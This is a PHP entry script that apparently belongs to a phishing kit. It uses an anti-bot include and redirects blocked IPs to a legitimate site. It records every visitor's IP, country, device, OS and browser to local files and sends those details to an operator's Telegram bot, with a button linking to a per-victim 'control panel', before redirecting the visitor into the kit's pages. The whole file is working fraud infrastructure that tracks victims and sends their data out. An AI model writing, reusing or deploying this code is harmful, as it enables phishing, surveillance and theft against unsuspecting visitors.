<?php
	error_reporting(0);
    session_start();

    include "./antibots-debug/antibots.php";
    include "./libraries/get-country-code.php";
	include "./libraries/UserInfo.php";
	include "./setting/functions.php";


    function isBlocked($ip) {
        $blockedIPs = file_get_contents('./panel/blocked_ips.txt');
        return strpos($blockedIPs, $ip) !== false;
    }

    $userIP = get_client_ip();

    if (isBlocked($userIP)) {
        header("Location: https://www.superhonda.com/");
        exit();
    }

    $code_country_visit = $detector->api();
    $_SESSION['code_country_visit'] = $code_country_visit;
	$ip = get_client_ip();
    $present_time = date("H:i:s"."-"."m/d/y");

    if ($_SERVER['HTTP_HOST'] === "localhost") {
        $_SERVER['HTTP_HOST'] = "127.0.0.1";
    }

    $currentUrl = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $parsedUrl = parse_url($currentUrl);
    $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
    $segments = explode('/', trim($path, '/'));
    $firstFolder = !empty($segments[0]) ? $segments[0] : 'default_folder';
    $newLink = "https://" . $_SERVER['HTTP_HOST'] . "/$firstFolder/control-panel/panel.php?id_user=$ip";
    $randomNumber = rand(0, 1000000);
    $user_ip = get_client_ip(). " - " . $_SESSION['code_country_visit']; 
    $id_user = $randomNumber; 
    $current_page = "IN WEBSITE";
    $timestamp =  date("Y-m-d H:i:s");
    $userStatus = "<span class='online'></span>";
    $user_agent =   " DEVICE = " .UserInfo::get_device()." SYSTEM TYPE = ". UserInfo::get_os(). " BROWSER VISIT = ". UserInfo::get_browser();
    $link_panel = $newLink;
    $block_user = get_client_ip();
    $user_data = "$id_user,$current_page,$user_ip,$timestamp,$user_agent,$link_panel,$block_user\n";
    file_put_contents("./panel/get-panel/info-panel.txt", $user_data, FILE_APPEND);
    $link = $newLink;
    $_SESSION["panel_control"] = $link;
    $_SESSION["id_user"] = $id_user;

    $user_data = array(
        'userStatus' => $userStatus,
        'id_user' => $id_user,
        'current_page' => $current_page,
        'user_ip' => $user_ip,
        'timestamp' => $timestamp,
        'user_agent' => $user_agent,
        'redirect_user' => " " 
    );

    $json_data = json_encode($user_data);
    $name_file = str_replace(".", "-", $ip);
    $file_path = "./panel/storage/{$name_file}.json";

    if (file_exists($file_path)) {
        unlink($file_path);
    }
    
    file_put_contents($file_path, $json_data);

    // Send Data To Telegram :
    $message= urlencode("👥========= VISIT =========👥\r\n" . 
    "📍IP - ".get_client_ip()."\t\t | \t\t". 
    $_SESSION['code_country_visit'] ."\r\n". 
    "💻 DEVICE = " .UserInfo::get_device()."\r\n".
    "♻️ SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
    "🌐 BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
    "DATE AND TIME = ". $present_time ."\r\n");
    telegram($message);
    $botToken = TOKEN;
    $chatId = CHATID;
    $buttonText = 'Link Panel - '. get_client_ip();
    $telegramApiEndpoint = "https://api.telegram.org/bot$botToken/sendMessage";
    $keyboard = [
        'inline_keyboard' => [
            [
                [
                    'text' => $buttonText,
                    'url' => $link,
                ],
            ],
        ],
    ];
    $keyboardJson = json_encode($keyboard);
    $messageData = [
        'chat_id' => $chatId,
        'text' => 'Click For Open Panel Control For This Ip Address : [ ' . get_client_ip() . " - " . $_SESSION['code_country_visit'].' ]',
        'reply_markup' => $keyboardJson,
    ];
    $ch = curl_init($telegramApiEndpoint);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $messageData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Save Data In Document Text :
    $text_to_result = "========= VISIT =========\r\n" . 
    "IP - ".get_client_ip()."\t\t | \t\t". 
    $_SESSION['code_country_visit'] ."\r\n". 
    " DEVICE = " .UserInfo::get_device()."\r\n".
    " SYSTEM TYPE = ". UserInfo::get_os()."\r\n". 
    " BROWSER VISIT = ". UserInfo::get_browser()."\r\n".
    "DATE AND TIME = ". $present_time ."\r\n";

    $file = fopen("./file/file.txt", "a");
    fwrite($file, $text_to_result. "\n");
    fclose($file);
    
    echo 
    "<script>
        window.location = './pages/index.php';
    </script>";

exit;
?>